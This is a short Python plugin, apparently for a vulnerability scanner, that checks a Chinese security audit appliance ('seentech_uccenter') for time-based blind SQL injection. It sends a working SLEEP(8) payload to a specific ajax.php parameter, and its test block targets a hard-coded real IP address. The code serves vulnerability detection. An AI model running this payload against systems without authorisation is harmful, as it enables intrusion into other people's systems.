#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer: http://www.wooyun.org/bugs/wooyun-2010-0133628
#   中科新业网络安全审计系统SQL注入
import time
def assign(service, arg):
    if service == "seentech_uccenter":
        return True, arg

def audit(arg):
    url = arg + "manage/main/tree/tree/ajax.php?action=expand_node&id=123"
    payload1 = "+AND+(SELECT+*+FROM+(SELECT(SLEEP(8)))ToKi)"
    t1 = time.time()
    code1,_,_,_,_ = curl.curl2(url)
    true_time = time.time() - t1
    t2 = time.time()
    code2,_,_,_,_ = curl.curl2(url+payload1)
    false_time = time.time() - t2
    if code1==200 and code2 == 200 and false_time-true_time>7:
        security_hole(url+payload1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('seentech_uccenter', 'https://219.134.131.240/')[1])